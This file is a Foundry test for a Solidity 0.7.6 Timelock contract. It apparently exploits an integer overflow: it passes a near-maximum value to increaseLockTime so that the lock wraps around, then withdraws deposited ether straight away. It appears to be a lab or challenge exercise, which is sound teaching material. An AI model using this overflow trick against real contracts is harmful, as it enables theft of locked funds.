// SPDX-License-Identifier: UNLICENSED
pragma abicoder v2;
pragma solidity 0.7.6;


import "forge-std/Test.sol";
import "../src/Timelock.sol";

contract TimelockTest is Test {
    Timelock public timelock;
    address me = makeAddr("ceseshi");

    function setUp() public {
        timelock = new Timelock();
        deal(me, 1 ether);
        vm.prank(me);
        timelock.deposit{value: 1 ether}();
    }

    function testTimelock() public {
        vm.startPrank(me);
        timelock.increaseLockTime(type(uint256).max - 1 weeks);
        timelock.withdraw();
    }
}